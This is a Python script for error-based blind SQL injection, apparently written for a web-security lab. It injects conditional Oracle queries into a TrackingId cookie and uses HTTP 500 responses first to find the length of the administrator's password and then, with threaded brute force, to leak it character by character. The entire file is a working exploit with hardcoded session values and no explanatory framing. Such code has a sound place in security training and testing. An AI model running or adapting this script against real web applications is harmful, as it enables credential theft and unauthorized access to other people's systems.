import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://<REDACTED>"
CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789@#!$%&?"

# SPECIFYING PAYLOAD:
PAYLOAD = "SELECT password FROM users WHERE username = 'administrator'"

# SPECIFY LENGTH OF THE PASSWORD TO BRUTE FORCE:
START = 1
END = 35

# Variable to store leaked password
PASSWORD = ""

def passwordLengthFinder(trackingID, session):
    for i in range(START, END+1):
        cookie = {'TrackingId': trackingID, 'session': session}
        cookie["TrackingId"] += f"' ||(SELECT CASE WHEN (LENGTH(({PAYLOAD})) = {i}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
        response = requests.get(URL, cookies=cookie)
        if response.status_code == 500:
            print("\nLength of password: %#d" % i)
            return i

def attempt_character(trackingID, session, i, c):
    cookie = {'TrackingId': trackingID, 'session': session}
    cookie["TrackingId"] += f"' ||(SELECT CASE WHEN (SUBSTR((({PAYLOAD})),{i} ,1) = '{c}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--"
    response = requests.get(URL, cookies=cookie)
    if response.status_code == 500:
        return c
    return None

def leakPassword(length, trackingID, session):
    print(f"\nInitiating brute force for {length}-length password....")
    global PASSWORD
    with ThreadPoolExecutor(max_workers=14) as executor:
        for i in range(1, length + 1):
            futures = [executor.submit(attempt_character, trackingID, session, i, c) for c in CHARACTERS]
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    print(f"Leaked character (in loop {i}): {result}")
                    PASSWORD += result
                    break
    print(f"\nLeaked {length}-length password is: {PASSWORD}")

# trackingID and session for cookie:
trackingID = "qh0Wr08e0InUit9t"
session = "3AWtejdk3WHgb5a0WAjCQFkLsyubr7hC"

if __name__ == "__main__":
    length = passwordLengthFinder(trackingID, session)
    leakPassword(length, trackingID, session)
